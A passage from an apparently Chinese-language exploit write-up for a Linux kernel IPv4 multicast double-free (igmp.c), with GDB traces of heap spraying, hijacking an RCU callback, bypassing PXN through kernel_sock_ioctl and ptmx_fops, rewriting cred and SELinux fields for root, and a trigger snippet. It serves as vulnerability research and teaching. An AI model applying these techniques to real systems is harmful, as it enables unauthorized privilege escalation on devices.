class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Breakpoint <span class="number">2</span>, ip_mc_drop_socket (sk=<span class="number">0xd3864940</span>) at net/ipv4/igmp.c:<span class="number">2287</span></div><div class="line"><span class="number">2287</span>   &#123;</div><div class="line">(gdb) n</div><div class="line"><span class="number">2292</span>       <span class="keyword">if</span> (inet-&gt;mc_list == <span class="literal">NULL</span>)</div><div class="line"><span class="number">2295</span>       rtnl_lock();</div><div class="line"><span class="number">2305</span>          atomic_sub(<span class="keyword">sizeof</span>(*iml), &amp;sk-&gt;sk_omem_alloc);</div><div class="line"><span class="number">2296</span>       <span class="keyword">while</span> ((iml = rtnl_dereference(inet-&gt;mc_list)) != <span class="literal">NULL</span>) &#123;</div><div class="line">(gdb) p *iml</div><div class="line">$<span class="number">3</span> = &#123;</div><div class="line">  next_rcu = <span class="number">0x0</span>,</div><div class="line">  multi = &#123;</div><div class="line">    imr_multiaddr = &#123;</div><div class="line">      s_addr = <span class="number">16843240</span></div><div class="line">    &#125;,</div><div class="line">    imr_address = &#123;</div><div class="line">      s_addr = <span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    imr_ifindex = <span class="number">2</span></div><div class="line">  &#125;,</div><div class="line">  sfmode = <span class="number">0</span>,</div><div class="line">  sflist = <span class="number">0x0</span>,</div><div class="line">  rcu = &#123;</div><div class="line">    next = <span class="number">0x0</span>,</div><div class="line">    func = <span class="number">0x0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第二次在ip_mc_drop_socket函数断下的时候，说明程序执行到了第二次调用释放socket函数的位置，此时再次查看一下该结构体内存中的数据，可以看到因为第一次释放套接字的时候已经把最开始申请的内存释放了,并且已经成功喷射成了我们伪造的数据，0xc6d2dd80已经指向的是我们喷射的数据，因为0xb6efb000是我们在Exp中使用mmap映射出来的地址，所以sflist指针指向的是我们<code>用户态</code>随意控制的数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Breakpoint <span class="number">2</span>, ip_mc_drop_socket (sk=<span class="number">0xd3865240</span>) at net/ipv4/igmp.c:<span class="number">2287</span></div><div class="line"><span class="number">2287</span>   &#123;</div><div class="line">(gdb) n</div><div class="line"><span class="number">2292</span>       <span class="keyword">if</span> (inet-&gt;mc_list == <span class="literal">NULL</span>)</div><div class="line"><span class="number">2295</span>       rtnl_lock();</div><div class="line"><span class="number">2305</span>          atomic_sub(<span class="keyword">sizeof</span>(*iml), &amp;sk-&gt;sk_omem_alloc);</div><div class="line"><span class="number">2296</span>       <span class="keyword">while</span> ((iml = rtnl_dereference(inet-&gt;mc_list)) != <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="number">2299</span>          inet-&gt;mc_list = iml-&gt;next_rcu;</div><div class="line">(gdb) p iml</div><div class="line">$<span class="number">4</span> = (<span class="keyword">struct</span> ip_mc_socklist *) <span class="number">0xc6d2dd80</span></div><div class="line">(gdb) p *iml</div><div class="line">$<span class="number">5</span> = &#123;</div><div class="line">  next_rcu = <span class="number">0x0</span>,</div><div class="line">  multi = &#123;</div><div class="line">    imr_multiaddr = &#123;</div><div class="line">      s_addr = <span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    imr_address = &#123;</div><div class="line">      s_addr = <span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    imr_ifindex = <span class="number">123456</span></div><div class="line">  &#125;,</div><div class="line">  sfmode = <span class="number">0</span>,</div><div class="line">  sflist = <span class="number">0xb6efb000</span>,</div><div class="line">  rcu = &#123;</div><div class="line">    next = <span class="number">0x0</span>,</div><div class="line">    func = <span class="number">0x0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>查看一下sflist指针指向的内存数据，然后对照下内核源码中的该结构体，0xeeeeeeee正好就是函数指针，并且在ip_mc_leave_src函数中存在一个kfree_rcu函数可以把sflist指向的psf变量中的callback_head链入到rcu回调函数链表中，我们只要精心构造一下喷射数据就可以成功执行到该kfree_rcu处</p>
<pre><code>(gdb) x/10x 0xb6efb000
0xb6efb000:   0x00000000 0x00000000 0x00000000 0xeeeeeeee
0xb6efb010:   0x00000000 0x00000000 0x00000000 0x00000000
0xb6efb020:   0x00000000 0x00000000
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">ip_mc_leave_src (sk=<span class="number">0xd3865240</span>, iml=<span class="number">0xc6d2dd80</span>, in_dev=<span class="number">0x0</span>)</div><div class="line">    at net/ipv4/igmp.c:<span class="number">1834</span></div><div class="line"><span class="number">1834</span>   &#123;</div><div class="line">(gdb) s</div><div class="line"><span class="number">1835</span>       <span class="keyword">struct</span> ip_sf_socklist *psf = rtnl_dereference(iml-&gt;sflist);</div><div class="line">(gdb) s</div><div class="line"><span class="number">1834</span>   &#123;</div><div class="line"><span class="number">1838</span>       <span class="keyword">if</span> (psf == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="number">1844</span>              iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, <span class="number">0</span>);</div><div class="line"><span class="number">1843</span>       err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</div><div class="line"><span class="number">1845</span>       RCU_INIT_POINTER(iml-&gt;sflist, <span class="literal">NULL</span>);</div><div class="line"><span class="number">1847</span>       atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</div><div class="line"><span class="number">1843</span>       err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</div><div class="line"><span class="number">1847</span>       atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</div><div class="line">(gdb) p psf</div><div class="line">$<span class="number">6</span> = (<span class="keyword">struct</span> ip_sf_socklist *) <span class="number">0xb6efb000</span></div><div class="line">(gdb) p *psf</div><div class="line">$<span class="number">7</span> = &#123;</div><div class="line">  sl_max = <span class="number">0</span>,</div><div class="line">  sl_count = <span class="number">0</span>,</div><div class="line">  rcu = &#123;</div><div class="line">    next = <span class="number">0x0</span>,</div><div class="line">    func = <span class="number">0xeeeeeeee</span></div><div class="line">  &#125;,</div><div class="line">  sl_addr = <span class="number">0xb6efb010</span></div><div class="line">&#125;</div><div class="line"><span class="number">1848</span>       kfree_rcu(psf, rcu);</div><div class="line">(gdb) x/<span class="number">10</span>x <span class="number">0xb6efb000</span></div><div class="line"><span class="number">0xb6efb000</span>:   <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000008</span></div><div class="line"><span class="number">0xb6efb010</span>:   <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span></div><div class="line"><span class="number">0xb6efb020</span>:   <span class="number">0x00000000</span> <span class="number">0x00000000</span></div></pre></td></tr></table></figure>
<p>注意:因为kfree_rcu函数会把我们设置的rcu-&gt;func的值修改为别的数据，所以我们调试的时候手动把用户态地址0xb6efb00c中的值修改回0xeeeeeeee(写Exp的时候可以开一个线程循环对其修改即可)<br>当设置好ruc回调函数后等着内核调用就好了,这样就顺利的控制了内核态的PC指针,并且参数1是可控。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> __rcu_reclaim(<span class="keyword">char</span> *rn, <span class="keyword">struct</span> rcu_head *head)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> offset = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)head-&gt;func;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (__is_kfree_rcu_offset(offset)) &#123;</div><div class="line">       RCU_TRACE(trace_rcu_invoke_kfree_callback(rn, head, offset));</div><div class="line">       kfree((<span class="keyword">void</span> *)head - offset);</div><div class="line">       <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">       RCU_TRACE(trace_rcu_invoke_callback(rn, head));</div><div class="line">       head-&gt;func(head);                                                               <span class="comment">/*控制执行流*/</span></div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>需要喷射的结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ip_mc_socklist &#123;</div><div class="line">    <span class="keyword">struct</span> ip_mc_socklist __rcu *next_rcu;</div><div class="line">    <span class="keyword">struct</span> ip_mreqn      multi;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>      sfmode;       <span class="comment">/* MCAST_&#123;INCLUDE,EXCLUDE&#125; */</span></div><div class="line">    <span class="keyword">struct</span> ip_sf_socklist __rcu *sflist;</div><div class="line">    <span class="keyword">struct</span> rcu_head      rcu;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>用户态伪造结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ip_sf_socklist &#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    sl_max;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    sl_count;</div><div class="line">    <span class="keyword">struct</span> rcu_head    *rcu;</div><div class="line">    __be32    sl_addr[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h3 id="Root提权"><a href="#Root提权" class="headerlink" title="Root提权"></a>Root提权</h3><p>现在我们已经能够成功劫持内核执行流程了,接下来要做的就是如何劫持内核执行来达到内核提权的效果。<br>1.修改exp进程的addr_limit字段,实现内核任意访问<br>虽然成功劫持了内核的执行,但是离我们的目标还差一步,因为现在的内核默认是开启了PXN(Privileged execute-never)保护的,所以我们不能直接让内核去执行我们用户态的权限提升shellcode,我们需要实现对内核进行任意读写,通过任意读写来完成权限提升。<br>    首先我们来看一个结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> thread_info &#123;</div><div class="line">	<span class="keyword">struct</span> pcb_struct	pcb;		<span class="comment">/* palcode state */</span></div><div class="line">	<span class="keyword">struct</span> task_struct	*task;		<span class="comment">/* main task structure */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags;		<span class="comment">/* low level flags */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		ieee_state;	<span class="comment">/* see fpu.h */</span></div><div class="line">	<span class="keyword">struct</span> exec_domain	*exec_domain;	<span class="comment">/* execution domain */</span></div><div class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;	<span class="comment">/* thread address space */</span></div><div class="line">	<span class="keyword">unsigned</span>		cpu;		<span class="comment">/* current CPU */</span></div><div class="line">	<span class="keyword">int</span>			preempt_count; <span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; BUG */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		status;		<span class="comment">/* thread-synchronous flags */</span></div><div class="line">	<span class="keyword">int</span> bpt_nsaved;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> bpt_addr[<span class="number">2</span>];		<span class="comment">/* breakpoint handling  */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> bpt_insn[<span class="number">2</span>];</div><div class="line">	<span class="keyword">struct</span> restart_block	restart_block;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>系统中的每一个线程都会分配自己的堆栈,其底部存在一个thread_info结构体,该结构体记录着当前线程的一些属性,结构体中的addr_limit元素表示当前线程可访问的地址空间,就是因为该元素所以正常情况下我们用户态程序不能访问内核态内存,但是如果我们把该字段的内容改为-1(0xffffffffffffffff),那么对应的线程就能访问任意内核地址了。<br>    但是我们如何去修改addr_limit呢? </p>
<ol>
<li><p>泄漏线程sp,计算thread_info地址,索引修改addr_limit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 通过泄漏的sp计算出thread_info的地址 THREAD_SIZE==8192 */</span></div><div class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)(current_stack_pointer &amp; ~(THREAD_SIZE - <span class="number">1</span>));</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>利用内核中本来就存在的对addr_limit值进行修改的函数,不过一般这类函数都是成对出现,先修改为新值,再恢复为原始值,我们需要想办法绕过恢复操作(例:kernel_sock_ioctl)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_sock_ioctl</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">mm_segment_t</span> oldfs = get_fs();</div><div class="line">	<span class="keyword">int</span> err;</div><div class="line">	set_fs(KERNEL_DS);								<span class="comment">/* 修改addr_limit为0xffffffffffffffff*/</span></div><div class="line">----	err = sock-&gt;ops-&gt;ioctl(sock, cmd, arg);		<span class="comment">/* 参数1可控函数指针 直接跳转到return err处执行*/</span></div><div class="line">|	set_fs(oldfs);									<span class="comment">/* 恢复旧的addr_limit 跳过该条指令的执行*/</span></div><div class="line">---&gt;	<span class="keyword">return</span> err;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>在内核函数中存在一个kernel_sock_ioctl函数,该函数存在一个函数指针调用,而这个函数指针又正由参数1所控制,我们就可以在执行完set_fs(KERNEL_DS)函数完后,如果参数1可控,通过控制的函数指针,直接跳转到函数末尾处,这样就绕过了set_fs(oldfs)恢复addr_limit的操作。<br>这里需要注意的是,<code>我们不能在最开始通过触发漏洞去劫持内核执行流程时调用kernel_sock_ioctl函数修改addr_limit,因为这样调用修改的不是我们exp线程的thread_info中的addr_info,只有exp线程调用kernel_sock_ioctl函数修改的才是exp线程的thread_info中的addr_info成员</code>,但是kernel_sock_ioctl函数用户态程序是不能直接调用的,那么如何实现让用户态调用该函数呢?<br>我们知道在linux内核中有许多file_operations结构体类型的全局符号,这类结构体有个特点就是其成员是一组函数指针,每个打开的文件(在内部由一个file结构体表示)都会和一组函数指针关联(通过包含指向一个file_operation结构的f_op字段),这组函数指针用来完成一些用户层函数的功能,用户层可以调用对应的用户层API来触发这些函数指针,我们可以查找一个file_operation结构体变量,把它的某个函数指针指向kernel_sock_ioctl函数,再去调用这个函数指针对应的应用层API，这样的话实际调用的其实是kernel_sock_ioctl函数。合适的函数指针需要满足以下条件:</p>
<ol>
<li>该函数指针可以被用户层触发调用。</li>
<li>函数指针的参数1可以被我们伪造成想要的结构体。</li>
</ol>
<p>查找内核源码发现全局符号ptmx_fops中的check_flags函数指针比较合适。<br>我们可以通过/proc/kallsyms文件来获取我们需要的符号地址(ptmx_fops-&gt;check_flags,kernel_sock_ioctl),同时还需要在内核中找到一条能完成任意地址写的ROP链,常用的查找工具有<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>,在触发漏洞控制内核执行时调用这条ROP链,把kernel_sock_ioctl函数地址写入到ptmx_fops-&gt;check_flags函数指针中,修改完毕后让exp线程去打开/dev/ptmx文件,使用fcntl(fd, F_SETFL, jopdata)去触发kernel_sock_ioctl函数,jopdata为我们控制的参数1,可以使用mmap来映射出一片地址,伪造一个socket结构体来控制内核函数kernel_sock_ioctl的跳转位置。这样就轻松修改了exp的addr_limit元素,exp进程就能轻易地对内核进行任意访问了。    </p>
<p>2.封装pipe函数,实现内核任意读写,获取exp进程的task_struct结构体,通过task_struct结构体获取该进程的cred结构体<br>    因为exp进程已经可以对内核态任意访问,我们就可以直接在用户态使用pipe对内核进行任意读写,现在我们需要找到exp进程的task_struct结构体,然后根据task_struct结构体去查找cred结构体。<br>    查找task_struct结构体有两种方法。</p>
<ol>
<li>在线程的thread_info中就存在task_struct结构体,可以通过泄漏sp,然后计算出当前线程的task_struct,不过不适合当前这个漏洞</li>
<li>通过inti进程的task_struct结构体的特征码,暴力搜索。根据/proc/iomem文件获取内存分布,算出init进程task_struct可能存在的区间,找到init进程的task_struct后通过结构体内部链表进行遍历exp进程的task_struct结构体</li>
</ol>
<p>3.修改cred结构体中的关键字段(uid,gid….)切换SELinux context并关闭SELinux,实现权限提升<br>    通过找到exp的task_struct索引cred结构体,对cred结构体中的几个关键的字段进行修改:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> cred &#123;</div><div class="line">	<span class="keyword">atomic_t</span>	usage;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></div><div class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></div><div class="line">	<span class="keyword">void</span>		*put_addr;</div><div class="line">	<span class="keyword">unsigned</span>	magic;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></div><div class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></div><div class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></div><div class="line">					 * keys to */</div><div class="line">	<span class="keyword">struct</span> key __rcu *session_keyring; <span class="comment">/* keyring inherited over fork */</span></div><div class="line">	<span class="keyword">struct</span> key	*process_keyring; <span class="comment">/* keyring private to this process */</span></div><div class="line">	<span class="keyword">struct</span> key	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></div><div class="line">	<span class="keyword">struct</span> key	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></div><div class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span>		<span class="comment">/* &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  selinux context &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; task_security_struct */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	<span class="keyword">struct</span> user_struct *user;	<span class="comment">/* real user ID subscription */</span></div><div class="line">	<span class="keyword">struct</span> user_namespace *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></div><div class="line">	<span class="keyword">struct</span> group_info *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></div><div class="line">	<span class="keyword">struct</span> rcu_head	rcu;		<span class="comment">/* RCU deletion hook */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<ul>
<li><p>进程uid,gid相关的字段改为0(root对应的uid,gid)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cred.uid = <span class="number">0</span>;</div><div class="line">cred.gid = <span class="number">0</span>;</div><div class="line">cred.suid = <span class="number">0</span>;</div><div class="line">cred.sgid = <span class="number">0</span>;</div><div class="line">cred.euid = <span class="number">0</span>;</div><div class="line">cred.egid = <span class="number">0</span>;</div><div class="line">cred.fsuid = <span class="number">0</span>;</div><div class="line">cred.fsgid = <span class="number">0</span>;</div></pre></td></tr></table></figure>
</li>
<li><p>进程capability相关的字段改为0xffffffffffffffff(表示全部拥有),每个进程有三个和能力相关的位图:inheritable(I),permitted(P),effective(E)可以通过cat /proc/PID/status来查看进程所拥有的能力。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cred.cap_inheritable.cap[<span class="number">0</span>] = <span class="number">-1</span>;	<span class="comment">/* cap_inheritable:表示被当前进程执行的程序能够继承的能力 */</span></div><div class="line">cred.cap_inheritable.cap[<span class="number">1</span>] = <span class="number">-1</span>;</div><div class="line">cred.cap_permitted.cap[<span class="number">0</span>] = <span class="number">-1</span>;		<span class="comment">/* cap_permitted:表示进程能够使用的能力*/</span></div><div class="line">cred.cap_permitted.cap[<span class="number">1</span>] = <span class="number">-1</span>;</div><div class="line">cred.cap_effective.cap[<span class="number">0</span>] = <span class="number">-1</span>;		<span class="comment">/* cap_effective:表示进程实际拥有的能力,当进程要进行某个特权操作时,内核会检查cap_effective对应位是否有效,[权限列表](http://man7.org/linux/man-pages/man7/capabilities.7.html)*/</span></div><div class="line">cred.cap_effective.cap[<span class="number">1</span>] = <span class="number">-1</span>;</div><div class="line">cred.cap_bset.cap[<span class="number">0</span>] = <span class="number">-1</span>;</div><div class="line">cred.cap_bset.cap[<span class="number">1</span>] = <span class="number">-1</span>;</div></pre></td></tr></table></figure>
</li>
<li><p>cred结构体中的security成员指向task_security_struct结构体,编译条件CONFIG_SECURITY,提权时需要把该结构体中的osid,sid修改为init进程对应的soid,sid这样的话exp进程的selinux context就切换成了init对应的selinux context了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> task_security_struct &#123;</div><div class="line">	u32 osid;		<span class="comment">/* SID prior to last execve */</span></div><div class="line">	u32 sid;		<span class="comment">/* current SID */</span></div><div class="line">	u32 exec_sid;		<span class="comment">/* exec SID */</span></div><div class="line">	u32 create_sid;		<span class="comment">/* fscreate SID */</span></div><div class="line">	u32 keycreate_sid;	<span class="comment">/* keycreate SID */</span></div><div class="line">	u32 sockcreate_sid;	<span class="comment">/* fscreate SID */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="getroot.png" alt=""></p>
<h3 id="触发模型"><a href="#触发模型" class="headerlink" title="触发模型:"></a>触发模型:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">setsockopt(parent_socket, <span class="number">0x0</span>, MCAST_JOIN_GROUP, &amp;group, <span class="keyword">sizeof</span>(group));       <span class="comment">//申请内存</span></div><div class="line"><span class="keyword">if</span> (listen(parent_socket, <span class="number">2</span>))&#123;</div><div class="line">   perror(<span class="string">"error: \n"</span>);</div><div class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="number">1</span>)&#123;</div><div class="line">   <span class="keyword">socklen_t</span> len = <span class="number">0</span>;</div><div class="line">   child_sockfd = accept(parent_socket,(sockaddr*)&amp;client,&amp;len);             <span class="comment">//创建子套接字,并和父套接字共用同一块内存</span></div><div class="line">   <span class="keyword">if</span> (child_sockfd == <span class="number">-1</span>)&#123;</div><div class="line">       perror(<span class="string">"error: \n"</span>);</div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">   &#125;</div><div class="line">   close(child_sockfd);        <span class="comment">//关闭子套接字,第一次释放</span></div><div class="line">&#125;</div><div class="line">sleep(<span class="number">4</span>);</div><div class="line">close(parent_socket);           <span class="comment">//关闭父套接字,第二次释放</span></div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.在使用GDB调试时使用set print pretty on选项,查看结构体的时候会更加的直观。<br>2.官方说漏洞属于DoubleFree漏洞,但是我们利用时使用的却是UAF常用利用方法。</p>
<ul>
<li>通过喷射占位结构体,然后使用喷射结构体中的某个函数指针对执行流进行控制</li>
<li>把Double Free漏洞转换为Use After Free漏洞</li>
</ul>
<p>3.在文中有些地方表述的还不是太清楚,还需要通过多写文章进行练习表达能力</p>
